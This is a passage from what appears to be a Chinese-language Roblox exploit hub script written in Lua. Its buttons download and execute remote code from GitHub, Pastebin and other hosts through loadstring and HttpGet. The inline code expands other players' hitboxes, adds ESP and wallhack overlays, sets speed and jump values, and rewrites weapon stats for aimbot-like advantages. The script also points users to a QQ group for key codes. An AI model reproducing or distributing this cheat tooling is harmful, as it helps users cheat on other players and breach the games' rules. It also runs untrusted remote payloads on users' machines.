TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "执行"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

Blue.Name = "蓝色"
Blue.Parent = main
Blue.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
Blue.Position = UDim2.new(0.837480664, 0, 0.0995475128, 0)
Blue.Size = UDim2.new(0, 37, 0, 31)
Blue.Font = Enum.Font.SourceSans
Blue.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
Blue.PlaceholderText = "蓝色"
Blue.Text = ""
Blue.TextColor3 = Color3.fromRGB(0, 0, 0)
Blue.TextSize = 14.000
game:GetService('RunService').RenderStepped:connect(function()
	for i,v in next, game:GetService('Players'):GetPlayers() do
		if v.Name ~= game:GetService('Players').LocalPlayer.Name then
			v.Character.HumanoidRootPart.Size = Vector3.new(HitBox.Text,HitBox.Text,HitBox.Text)
			v.Character.HumanoidRootPart.Transparency = 0.8
			v.Character.HumanoidRootPart.Color = Color3.new(Red.Text,Green.Text,Blue.Text)
			v.Character.HumanoidRootPart.Material = "Neon"
			v.Character.HumanoidRootPart.CanCollide = false
		end
	end
end)
end)

Button = Page:CreateButton("群主专用橄榄的微笑", "", function()
    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Justaverageguym/Hub/main/Scripts/Infectious%20smile.lua")))()
end)

local Page = Tab:CreateFrame("脚本整合♳")

Button = Page:CreateButton("加入群719247153获得脚本", "", function()
    
end)

Button = Page:CreateButton("键盘", "手机必须使用按shilt隐藏脚本", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
end)

Button = Page:CreateButton("造船寻宝", "用按shilt隐藏脚本", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/XRoLLu/UWU/main/BUILD%20A%20BOAT%20FOR%20TREASURE.lua'))()
end)

Button = Page:CreateButton("鲨口求生", "按ch隐藏脚本", function()
    loadstring(game:HttpGet('https://ppearl.vercel.app'))()
end)

Button = Page:CreateButton("能力战争", "按shilt隐藏脚本", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/VxleLUA/Dynamic-Offical/main/System/GameChecker.lua"))()
end)

Button = Page:CreateButton("越狱", "卡密在群里", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/piglex9/icetray3/main/latest.lua"))()
end)


Button = Page:CreateButton("拍打战斗", "不能长时间打同一个人", function()
     
end)

Button = Page:CreateButton("夺旗战争", "暂时无法使用", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Flag%20Wars.txt'))()
end)

Button = Page:CreateButton("巨人模拟器", "自动秒杀巨人", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe/ToraIsMe/main/0giant", true))()
end)

Button = Page:CreateButton("洞穴", "Really", function()
    local CoreGui = game:GetService("StarterGui")
local Players = game:GetService("Players")

getgenv().HitboxSize = 30
getgenv().HitboxTransparency = 1

getgenv().HitboxStatus = false
getgenv().TeamCheck = false
getgenv().FriendCheck = false

getgenv().Walkspeed = 16
getgenv().Jumppower = 50

getgenv().esp = false
local highlights = {}
 
function start()
    while task.wait() do
        local esp = getgenv().esp
        local rake = game.Workspace:FindFirstChild("Rake")
        local rakeHighlight = game.CoreGui:FindFirstChild("Rake")
 
        if esp and rake then
            if not rakeHighlight then
                local highlight = Instance.new("Highlight", game.CoreGui)
                highlight.Name = "Rake"
                highlight.Adornee = rake
                highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                highlight.FillColor = Color3.fromRGB(255, 0, 0)
                highlights[rake] = highlight
            end
        else
            if rakeHighlight then
                rakeHighlight:Destroy()
                highlights[rake] = nil
            end
        end
    end
end

--// UI

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/UI-Library/main/Source/MyUILib(Unamed).lua"))();
local Window = Library:Create("HitBox 扩展器")

local ToggleGui = Instance.new("ScreenGui")
local Toggle = Instance.new("TextButton")

ToggleGui.Name = "ToggleGui_HE"
ToggleGui.Parent = game.CoreGui

Toggle.Name = "Toggle"
Toggle.Parent = ToggleGui
Toggle.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
Toggle.BackgroundTransparency = 0.660
Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)
Toggle.Size = UDim2.new(0.0650164187, 0, 0.0888099447, 0)
Toggle.Font = Enum.Font.SourceSans
Toggle.Text = "Click on"
Toggle.TextScaled = true
Toggle.TextColor3 = Color3.fromRGB(40, 40, 40)
Toggle.TextSize = 24.000
Toggle.TextXAlignment = Enum.TextXAlignment.Left
Toggle.Active = true
Toggle.Draggable = true
Toggle.MouseButton1Click:connect(function()
    Library:ToggleUI()
end)

local HomeTab = Window:Tab("主页","rbxassetid://10888331510")
local PlayerTab = Window:Tab("玩家","rbxassetid://12296135476")
local VisualTab = Window:Tab("视觉效果","rbxassetid://12308581351")

HomeTab:Section("设置")

HomeTab:Slider("Hitbox 尺寸 (滑动)", 0,300, function(value)
    getgenv().HitboxSize = value
end)

HomeTab:TextBox("Hitbox 尺寸 (输入)", function(value)
    getgenv().HitboxSize = value
end)

HomeTab:TextBox("Hitbox 透明度", function(number)
    getgenv().HitboxTransparency = number
end)

HomeTab:Section("菜单")

HomeTab:Toggle("距离: ", function(state)
	getgenv().HitboxStatus = state
    game:GetService('RunService').RenderStepped:connect(function()
		if HitboxStatus == true and TeamCheck == false and FriendCheck == false then
			for i,v in next, game:GetService('Players'):GetPlayers() do
				if v.Name ~= game:GetService('Players').LocalPlayer.Name then
					pcall(function()
						v.Character.HumanoidRootPart.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
						v.Character.HumanoidRootPart.Transparency = HitboxTransparency
						v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
						v.Character.HumanoidRootPart.Material = "Neon"
						v.Character.HumanoidRootPart.CanCollide = false
					end)
				end
			end
        elseif HitboxStatus == true and TeamCheck == false and FriendCheck == true then
            for i,v in next, game:GetService('Players'):GetPlayers() do
                for i2,v2 in pairs(game:GetService('Players'):GetChildren()) do
                    if v.Name ~= game:GetService('Players').LocalPlayer.Name and not v2:IsFriendsWith(game:GetService('Players').LocalPlayer.UserId) then
                        pcall(function()
                            v.Character.HumanoidRootPart.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
                            v.Character.HumanoidRootPart.Transparency = HitboxTransparency
                            v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
                            v.Character.HumanoidRootPart.Material = "Neon"
                            v.Character.HumanoidRootPart.CanCollide = false
                        end)
                    end
                end
			end
        elseif HitboxStatus == true and TeamCheck == true and FriendCheck == false then
            for i,v in next, game:GetService('Players'):GetPlayers() do
				if game:GetService('Players').LocalPlayer.Team ~= v.Team then
					pcall(function()
						v.Character.HumanoidRootPart.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
						v.Character.HumanoidRootPart.Transparency = HitboxTransparency
						v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
						v.Character.HumanoidRootPart.Material = "Neon"
						v.Character.HumanoidRootPart.CanCollide = false
					end)
				end
			end
        elseif HitboxStatus == true and TeamCheck == true and FriendCheck == true then
            for i,v in next, game:GetService('Players'):GetPlayers() do
				if game:GetService('Players').LocalPlayer.Team ~= v.Team and not game:GetService('Players'):IsFriendsWith(UserId) then
					pcall(function()
						v.Character.HumanoidRootPart.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
						v.Character.HumanoidRootPart.Transparency = HitboxTransparency
						v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
						v.Character.HumanoidRootPart.Material = "Neon"
						v.Character.HumanoidRootPart.CanCollide = false
					end)
				end
			end
		else
		    for i,v in next, game:GetService('Players'):GetPlayers() do
				if v.Name ~= game:GetService('Players').LocalPlayer.Name then
					pcall(function()
						v.Character.HumanoidRootPart.Size = Vector3.new(2,2,1)
						v.Character.HumanoidRootPart.Transparency = 1
						v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Medium stone grey")
						v.Character.HumanoidRootPart.Material = "Plastic"
						v.Character.HumanoidRootPart.CanCollide = false
					end)
				end
			end
		end
	end)
end)

HomeTab:Keybind("Toggle UI", Enum.KeyCode.F, function()
    Library:ToggleUI()
end)

PlayerTab:Slider("速度", 16,500, function(value)
    getgenv().Walkspeed = value
    pcall(function()
        game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = value
    end)
end)

PlayerTab:Slider("跳跃", 50,1000, function(value)
    getgenv().Jumppower = value
    pcall(function()
        game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = value
    end)
end)

PlayerTab:Slider("摄像头", 70,1200, function(v)
     game.Workspace.CurrentCamera.FieldOfView = v
end)

PlayerTab:Toggle("循环速度", function(state)
    getgenv().loopW = state
    game:GetService("RunService").Heartbeat:Connect(function()
        if loopW == true then
            pcall(function()
                game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed = Walkspeed
            end)
        end
    end)
end)

PlayerTab:Toggle("循环跳跃", function(state)
    getgenv().loopJ = state
    game:GetService("RunService").Heartbeat:Connect(function()
        if loopJ == true then
            pcall(function()
                game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower = Jumppower
            end)
        end
    end)
end)

VisualTab:Toggle("玩家高亮", function(state)
getgenv().enabled = state --Toggle on/off
getgenv().filluseteamcolor = true --Toggle fill color using player team color on/off
getgenv().outlineuseteamcolor = true --Toggle outline color using player team color on/off
getgenv().fillcolor = Color3.new(0, 0, 0) --Change fill color, no need to edit if using team color
getgenv().outlinecolor = Color3.new(1, 0, 0) --Change outline color, no need to edit if using team color
getgenv().filltrans = 0.5 --Change fill transparency
getgenv().outlinetrans = 0.5 --Change outline transparency

loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/RobloxScripts/main/Highlight-ESP.lua"))()
end)

VisualTab:Toggle("(所有人) ESP 名字", function(state)
    getgenv().ESPName = state
end)

VisualTab:Toggle("(敌对标志) ESP", function(arg)
    getgenv().esp = arg
    start()
end)

VisualTab:Toggle("敌对标志（字", function(arg)
    workspace.ChildAdded:Connect(function()
			if workspace:FindFirstChild("Rake") then
				for i,v in pairs(game.Workspace:GetDescendants()) do -- grabs everything from workspace
					if v.Name == 'Rake' then -- checks if it has a handle and if its a touchtransmitter
						local BillboardGui = Instance.new('BillboardGui') -- Makes Billboardgui
						local TextLabel = Instance.new('TextLabel') -- makes text label

						BillboardGui.Parent = v.Head -- what the billboardgui goes into
						BillboardGui.AlwaysOnTop = true -- if its on top or not
						BillboardGui.Size = UDim2.new(0, 25, 0, 50) -- size of it
						BillboardGui.StudsOffset = Vector3.new(0,2,0)

						TextLabel.Parent = BillboardGui -- putting textlabel into billboardgui
						TextLabel.BackgroundColor3 = Color3.new(1,1,1) -- color
						TextLabel.BackgroundTransparency = 1 -- transparency
						TextLabel.Size = UDim2.new(1, 0, 1, 0) -- size
						TextLabel.Text = "怪" -- what the label says
						TextLabel.TextColor3 = Color3.new(1, 0, 0) -- color
						TextLabel.TextScaled = true -- if the text is scaled or not
					end
				end
			end
		end)
		if workspace:FindFirstChild("Rake") then
			for i,v in pairs(game.Workspace:GetDescendants()) do -- grabs everything from workspace
				if v.Name == 'Rake' then -- checks if it has a handle and if its a touchtransmitter
					local BillboardGui = Instance.new('BillboardGui') -- Makes Billboardgui
					local TextLabel = Instance.new('TextLabel') -- makes text label

					BillboardGui.Parent = v.Head -- what the billboardgui goes into
					BillboardGui.AlwaysOnTop = true -- if its on top or not
					BillboardGui.Size = UDim2.new(0, 25, 0, 50) -- size of it
					BillboardGui.StudsOffset = Vector3.new(0,2,0)

					TextLabel.Parent = BillboardGui -- putting textlabel into billboardgui
					TextLabel.BackgroundColor3 = Color3.new(1,1,1) -- color
					TextLabel.BackgroundTransparency = 1 -- transparency
					TextLabel.Size = UDim2.new(1, 0, 1, 0) -- size
					TextLabel.Text = "怪" -- what the label says
					TextLabel.TextColor3 = Color3.new(1, 0, 0) -- color
					TextLabel.TextScaled = true -- if the text is scaled or not
				end
			end
		end
end)

VisualTab:Button("穿墙", function(s)
    loadstring(game:HttpGet("https://pastebin.com/raw/BuLeTr7j",true))()
end)

VisualTab:Toggle("无限体力", function(s)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/irlng/TheRakeRemastered/main/Inf%20Stamina.lua",true))()
end)

VisualTab:Toggle("全图高亮", function(state)
    local function brightFunc()
		game:GetService("Lighting").Brightness = 2
		game:GetService("Lighting").ClockTime = 14
		game:GetService("Lighting").FogEnd = 100000
		game:GetService("Lighting").GlobalShadows = false
		game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
	end

	local brightLoop = game:GetService("RunService").RenderStepped:Connect(brightFunc)
end)

VisualTab:Button("物资枪", function(state)
    if workspace:FindFirstChild("FlareGunPickUp") then
		for i,v in pairs(game.Workspace:GetDescendants()) do -- grabs everything from workspace
			if v.Name == 'FlareGunPickUp' then -- checks if it has a handle and if its a touchtransmitter
				local BillboardGui = Instance.new('BillboardGui') -- Makes Billboardgui
				local TextLabel = Instance.new('TextLabel') -- makes text label

				BillboardGui.Parent = v.FlareGun -- what the billboardgui goes into
				BillboardGui.AlwaysOnTop = true -- if its on top or not
				BillboardGui.Size = UDim2.new(0, 50, 0, 50) -- size of it
				BillboardGui.StudsOffset = Vector3.new(0,2,0)

				TextLabel.Parent = BillboardGui -- putting textlabel into billboardgui
				TextLabel.BackgroundColor3 = Color3.new(1,1,1) -- color
				TextLabel.BackgroundTransparency = 1 -- transparency
				TextLabel.Size = UDim2.new(1, 0, 1, 0) -- size
				TextLabel.Text = "信号枪" -- what the label says
				TextLabel.TextColor3 = Color3.new(1, 0, 0) -- color
				TextLabel.TextScaled = true -- if the text is scaled or not
			end
		end
	end
	
	workspace.ChildAdded:Connect(function()
		if workspace:FindFirstChild("FlareGunPickUp") then
			for i,v in pairs(game.Workspace:GetDescendants()) do -- grabs everything from workspace
				if v.Name == 'FlareGunPickUp' then -- checks if it has a handle and if its a touchtransmitter
					local BillboardGui = Instance.new('BillboardGui') -- Makes Billboardgui
					local TextLabel = Instance.new('TextLabel') -- makes text label

					BillboardGui.Parent = v.FlareGun -- what the billboardgui goes into
					BillboardGui.AlwaysOnTop = true -- if its on top or not
					BillboardGui.Size = UDim2.new(0, 50, 0, 50) -- size of it
					BillboardGui.StudsOffset = Vector3.new(0,2,0)

					TextLabel.Parent = BillboardGui -- putting textlabel into billboardgui
					TextLabel.BackgroundColor3 = Color3.new(1,1,1) -- color
					TextLabel.BackgroundTransparency = 1 -- transparency
					TextLabel.Size = UDim2.new(1, 0, 1, 0) -- size
					TextLabel.Text = "信号枪" -- what the label says
					TextLabel.TextColor3 = Color3.new(1, 0, 0) -- color
					TextLabel.TextScaled = true -- if the text is scaled or not
				end
			end
		end
	end)
end)

VisualTab:Button("建筑物品怪标注", function(arg)
    for i,v in pairs(game.Workspace:GetDescendants()) do -- grabs everything from workspace
		if v.Name == 'Map' then -- checks if it has a handle and if its a touchtransmitter
			local BillboardGui = Instance.new('BillboardGui') -- Makes Billboardgui
			local TextLabel = Instance.new('TextLabel') -- makes text label

			BillboardGui.Parent = v.SafeHouse.Light.RustyLightBase -- what the billboardgui goes into
			BillboardGui.AlwaysOnTop = true -- if its on top or not
			BillboardGui.Size = UDim2.new(0, 50, 0, 50) -- size of it
			BillboardGui.StudsOffset = Vector3.new(0,2,0)

			TextLabel.Parent = BillboardGui -- putting textlabel into billboardgui
			TextLabel.BackgroundColor3 = Color3.new(1,1,1) -- color
			TextLabel.BackgroundTransparency = 1 -- transparency
			TextLabel.Size = UDim2.new(1, 0, 1, 0) -- size
			TextLabel.Text = "安全屋" -- what the label says
			TextLabel.TextColor3 = Color3.new(153, 255, 85) -- color
			TextLabel.TextScaled = true -- if the text is scaled or not
			print('Worked')
		end
	end

	for i,v in pairs(game.Workspace:GetDescendants()) do -- grabs everything from workspace
		if v.Name == 'Map' then -- checks if it has a handle and if its a touchtransmitter
			local BillboardGui = Instance.new('BillboardGui') -- Makes Billboardgui
			local TextLabel = Instance.new('TextLabel') -- makes text label

			BillboardGui.Parent = v.ObservationTower.Lights.Core -- what the billboardgui goes into
			BillboardGui.AlwaysOnTop = true -- if its on top or not
			BillboardGui.Size = UDim2.new(0, 50, 0, 50) -- size of it
			BillboardGui.StudsOffset = Vector3.new(0,2,0)

			TextLabel.Parent = BillboardGui -- putting textlabel into billboardgui
			TextLabel.BackgroundColor3 = Color3.new(1,1,1) -- color
			TextLabel.BackgroundTransparency = 1 -- transparency
			TextLabel.Size = UDim2.new(1, 0, 1, 0) -- size
			TextLabel.Text = "灯塔" -- what the label says
			TextLabel.TextColor3 = Color3.new(255, 255, 255) -- color
			TextLabel.TextScaled = true -- if the text is scaled or not
			print('Worked2')
		end
	end

	for i,v in pairs(game.Workspace:GetDescendants()) do -- grabs everything from workspace
		if v.Name == 'Map' then -- checks if it has a handle and if its a touchtransmitter
			local BillboardGui = Instance.new('BillboardGui') -- Makes Billboardgui
			local TextLabel = Instance.new('TextLabel') -- makes text label

			BillboardGui.Parent = v.PowerStation.StationFolder.LightButton -- what the billboardgui goes into
			BillboardGui.AlwaysOnTop = true -- if its on top or not
			BillboardGui.Size = UDim2.new(0, 50, 0, 50) -- size of it
			BillboardGui.StudsOffset = Vector3.new(0,2,0)

			TextLabel.Parent = BillboardGui -- putting textlabel into billboardgui
			TextLabel.BackgroundColor3 = Color3.new(1,1,1) -- color
			TextLabel.BackgroundTransparency = 1 -- transparency
			TextLabel.Size = UDim2.new(1, 0, 1, 0) -- size
			TextLabel.Text = "发电站" -- what the label says
			TextLabel.TextColor3 = Color3.new(187, 221, 255) -- color
			TextLabel.TextScaled = true -- if the text is scaled or not
			print('Worked3')
		end
	end

	for i,v in pairs(game.Workspace:GetDescendants()) do -- grabs everything from workspace
		if v.Name == 'Map' then -- checks if it has a handle and if its a touchtransmitter
			local BillboardGui = Instance.new('BillboardGui') -- Makes Billboardgui
			local TextLabel = Instance.new('TextLabel') -- makes text label
			BillboardGui.Parent = v.Shack.ShopPart-- what the billboardgui goes into
			BillboardGui.AlwaysOnTop = true -- if its on top or not
			BillboardGui.Size = UDim2.new(0, 50, 0, 50) -- size of it
			BillboardGui.StudsOffset = Vector3.new(0,2,0)

			TextLabel.Parent = BillboardGui -- putting textlabel into billboardgui
			TextLabel.BackgroundColor3 = Color3.new(1,1,1) -- color
			TextLabel.BackgroundTransparency = 1 -- transparency
			TextLabel.Size = UDim2.new(1, 0, 1, 0) -- size
			TextLabel.Text = "商店" -- what the label says
			TextLabel.TextColor3 = Color3.new(255, 221, 0) -- color
			TextLabel.TextScaled = true -- if the text is scaled or not
			print('Worked4')
		end
	end
	for i,v in pairs(game.Workspace:GetDescendants()) do -- grabs everything from workspace
		if v.Name == 'Map' then -- checks if it has a handle and if its a touchtransmitter
			local BillboardGui = Instance.new('BillboardGui') -- Makes Billboardgui
			local TextLabel = Instance.new('TextLabel') -- makes text label

			BillboardGui.Parent = v.BaseCamp.TargetRegionPart -- what the billboardgui goes into
			BillboardGui.AlwaysOnTop = true -- if its on top or not
			BillboardGui.Size = UDim2.new(0, 50, 0, 50) -- size of it
			BillboardGui.StudsOffset = Vector3.new(0,2,0)

			TextLabel.Parent = BillboardGui -- putting textlabel into billboardgui
			TextLabel.BackgroundColor3 = Color3.new(1,1,1) -- color
			TextLabel.BackgroundTransparency = 1 -- transparency
			TextLabel.Size = UDim2.new(1, 0, 1, 0) -- size
			TextLabel.Text = "厂" -- what the label says
			TextLabel.TextColor3 = Color3.new(255, 0, 0) -- color
			TextLabel.TextScaled = true -- if the text is scaled or not
			print('Worked4')
		end
	end
end)

local c = workspace.CurrentCamera
local ps = game:GetService("Players")
local lp = ps.LocalPlayer
local rs = game:GetService("RunService")

local function esp(p,cr)
	local h = cr:WaitForChild("Humanoid")
	local hrp = cr:WaitForChild("Head")

	local text = Drawing.new("Text")
	text.Visible = false
	text.Center = true
	text.Outline = false 
	text.Font = 3
	text.Size = 16.16
	text.Color = Color3.new(170,170,170)

	local conection
	local conection2
	local conection3

	local function dc()
		text.Visible = false
		text:Remove()
		if conection then
			conection:Disconnect()
			conection = nil 
		end
		if conection2 then
			conection2:Disconnect()
			conection2 = nil 
		end
		if conection3 then
			conection3:Disconnect()
			conection3 = nil 
		end
	end

	conection2 = cr.AncestryChanged:Connect(function(_,parent)
		if not parent then
			dc()
		end
	end)

	conection3 = h.HealthChanged:Connect(function(v)
		if (v<=0) or (h:GetState() == Enum.HumanoidStateType.Dead) then
			dc()
		end
	end)

	conection = rs.RenderStepped:Connect(function()
		local hrp_pos,hrp_onscreen = c:WorldToViewportPoint(hrp.Position)
		if hrp_onscreen and ESPName == true then
			text.Position = Vector2.new(hrp_pos.X, hrp_pos.Y - 27)
			text.Text = p.DisplayName.." (@"..p.Name..")"
			text.Visible = true
		else
			text.Visible = false
		end
	end)
end

local function p_added(p)
	if p.Character then
		esp(p,p.Character)
	end
	p.CharacterAdded:Connect(function(cr)
		esp(p,cr)
	end)
end

for i,p in next, ps:GetPlayers() do 
	if p ~= lp then
		p_added(p)
	end
end

ps.PlayerAdded:Connect(p_added)
end)

Button = Page:CreateButton("超级大力士", "pc手机得狂点或者用键盘脚本", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe2/ToraIsMe2/main/0strongman", true))()
end)

Button = Page:CreateButton("兵工厂汉化", "屏幕要大不然会挡", function()
    -- Template is made by $Krew AKA @e.#3642
-- join my discord: https://discord.gg/JPTv7JkG8g
-- dont change the above!!

local KrewTemplate = Instance.new("ScreenGui")
local KrewTempOpen = Instance.new("Frame")
local Name = Instance.new("TextLabel")
local Line = Instance.new("TextLabel")
local ScrollingFrame = Instance.new("ScrollingFrame")
local UICorner = Instance.new("UICorner")
local Function1 = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Function2 = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Function3 = Instance.new("TextButton")
local UICorner_4 = Instance.new("UICorner")
local Function4 = Instance.new("TextButton")
local UICorner_5 = Instance.new("UICorner")
local Function5 = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local Function6 = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local Function7 = Instance.new("TextButton")
local UICorner_8 = Instance.new("UICorner")
local Function8 = Instance.new("TextButton")
local UICorner_9 = Instance.new("UICorner")
local Function9 = Instance.new("TextButton")
local UICorner_10 = Instance.new("UICorner")
local Function10 = Instance.new("TextButton")
local UICorner_11 = Instance.new("UICorner")
local CredsDontRemove = Instance.new("TextLabel")
local Close = Instance.new("TextButton")
local TempByKrew = Instance.new("Frame")
local TextButton = Instance.new("TextButton")

KrewTemplate.Name = "$KrewTemplate"
KrewTemplate.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
KrewTemplate.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

KrewTempOpen.Name = "$KrewTempOpen"
KrewTempOpen.Parent = KrewTemplate
KrewTempOpen.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
KrewTempOpen.BorderColor3 = Color3.fromRGB(60, 60, 60)
KrewTempOpen.Position = UDim2.new(0.248681813, 0, 0.245463297, 0)
KrewTempOpen.Size = UDim2.new(0.533831894, 0, 0.506991863, 0)

Name.Name = "Name"
Name.Parent = KrewTempOpen
Name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Name.BackgroundTransparency = 1.000
Name.Size = UDim2.new(0.245568082, 0, 0.0833867863, 0)
Name.Font = Enum.Font.SourceSans
Name.Text = "兵工厂脚本" -- put the gui name here
Name.TextColor3 = Color3.fromRGB(255, 255, 255)
Name.TextSize = 16.000

Line.Name = "Line"
Line.Parent = KrewTempOpen
Line.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Line.BackgroundTransparency = 1.000
Line.Position = UDim2.new(0.0978987217, 0, 0.0416933969, 0)
Line.Size = UDim2.new(0.0476846658, 0, 0.0833867863, 0)
Line.Font = Enum.Font.SourceSans
Line.Text = "”””””””””””" -- change if u dont want questionmarks
Line.TextColor3 = Color3.fromRGB(30, 30, 30)
Line.TextSize = 14.000

ScrollingFrame.Parent = KrewTempOpen
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
ScrollingFrame.BackgroundTransparency = 0.900
ScrollingFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
ScrollingFrame.Position = UDim2.new(0.0450695045, 0, 0.253367454, 0)
ScrollingFrame.Size = UDim2.new(0.928037941, 0, 0.683130264, 0)

UICorner.Parent = ScrollingFrame

Function1.Name = "Function1"
Function1.Parent = ScrollingFrame
Function1.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function1.Position = UDim2.new(0.0397513807, 0, 0.0140820052, 0)
Function1.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function1.Font = Enum.Font.SourceSans
Function1.Text = "枪" -- function one (attack and shit)
Function1.TextColor3 = Color3.fromRGB(0, 0, 0)
Function1.TextSize = 14.000
Function1.MouseButton1Down:Connect(function()
  local replicationstorage = game.ReplicatedStorage

for i, v in pairs(replicationstorage.Weapons:GetDescendants()) do
   if v.Name == "Auto" then
       v.Value = true
   end
   if v.Name == "RecoilControl" then
       v.Value = 0
   end
   if v.Name == "MaxSpread" then
       v.Value = 0
   end
   if v.Name == "ReloadTime" then
      v.Value = 1
   end
   if v.Name == "FireRate" then
       v.Value = 0.05
   end
   if v.Name == "Crit" then
       v.Value = 20
   end
end
end)

UICorner_2.Parent = Function1

Function2.Name = "Function2"
Function2.Parent = ScrollingFrame
Function2.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function2.Position = UDim2.new(0.0397513807, 0, 0.103883162, 0)
Function2.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function2.Font = Enum.Font.SourceSans
Function2.Text = "彩虹枪皮肤" -- function 2 (attack and shit)
Function2.TextColor3 = Color3.fromRGB(0, 0, 0)
Function2.TextSize = 14.000
Function2.MouseButton1Down:Connect(function()
  local c = 1 function zigzag(X)  return math.acos(math.cos(X * math.pi)) / math.pi end game:GetService("RunService").RenderStepped:Connect(function()  if game.Workspace.Camera:FindFirstChild('Arms') then   for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    if v.ClassName == 'MeshPart' then      v.Color = Color3.fromHSV(zigzag(c),1,1)     c = c + .0001    end   end  end end)
end)

UICorner_3.Parent = Function2

Function3.Name = "Function3"
Function3.Parent = ScrollingFrame
Function3.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function3.Position = UDim2.new(0.0397513807, 0, 0.195287913, 0)
Function3.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function3.Font = Enum.Font.SourceSans
Function3.Text = "瞄准" -- function 3 (attack and shit)
Function3.TextColor3 = Color3.fromRGB(0, 0, 0)
Function3.TextSize = 14.000
Function3.MouseButton1Down:Connect(function()
  function getplrsname()
for i,v in pairs(game:GetChildren()) do
if v.ClassName == "Players" then
return v.Name
end
end
end
local players = getplrsname()
local plr = game[players].LocalPlayer
coroutine.resume(coroutine.create(function()
while wait(1) do
coroutine.resume(coroutine.create(function()
for _,v in pairs(game[players]:GetPlayers()) do
if v.Name ~= plr.Name and v.Character then
v.Character.HeadHB.CanCollide = false
v.Character.HeadHB.Transparency = 10
v.Character.HeadHB.Size = Vector3.new(100,100,100)
v.Character.HumanoidRootPart.CanCollide = false
v.Character.HumanoidRootPart.Transparency = 10
v.Character.HumanoidRootPart.Size = Vector3.new(100,100,100)
end
end
end))
end
end))
function CreateSG(name,parent,face)
local SurfaceGui = Instance.new("SurfaceGui",parent)
SurfaceGui.Parent = parent
SurfaceGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
SurfaceGui.Face = Enum.NormalId[face]
SurfaceGui.LightInfluence = 0
SurfaceGui.ResetOnSpawn = false
SurfaceGui.Name = name
SurfaceGui.AlwaysOnTop = true
local Frame = Instance.new("Frame",SurfaceGui)
Frame.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
Frame.Size = UDim2.new(1,0,1,0)
end
while wait(1) do
for i,v in pairs (game:GetService("Players"):GetPlayers()) do
if v ~= game:GetService("Players").LocalPlayer and v.Character ~= nil and
v.Character:FindFirstChild("LowerTorso") and v.Character.LowerTorso:FindFirstChild("cham") == nil then
for i,v in pairs (v.Character:GetChildren()) do
if v:IsA("MeshPart") or v.Name == "LowerTorso" then
CreateSG("cham",v,"Back")
CreateSG("cham",v,"Front")
CreateSG("cham",v,"Left")
CreateSG("cham",v,"Right")
CreateSG("cham",v,"Right")
CreateSG("cham",v,"Top")
CreateSG("cham",v,"Bottom")
end
end
end
end
end
end)

UICorner_4.Parent = Function3

Function4.Name = "Function4"
Function4.Parent = ScrollingFrame
Function4.BackgroundColor3 = Color3.fromRGB(120, 120, 120)
Function4.Position = UDim2.new(0.0397513807, 0, 0.283485472, 0)
Function4.Size = UDim2.new(0.6324085, 0, 0.0735621452, 0)
Function4.Font = Enum.Font.SourceSans
Function4.Text = "速度" -- function 4 (attack and shit)
Function4.TextColor3 = Color3.fromRGB(0, 0, 0)
Function4.TextSize = 14.000
Function4.MouseButton1Down:Connect(function()
  net = true -- if false = do nothing
notify = true -- set this to false if u don't want to see notiflication


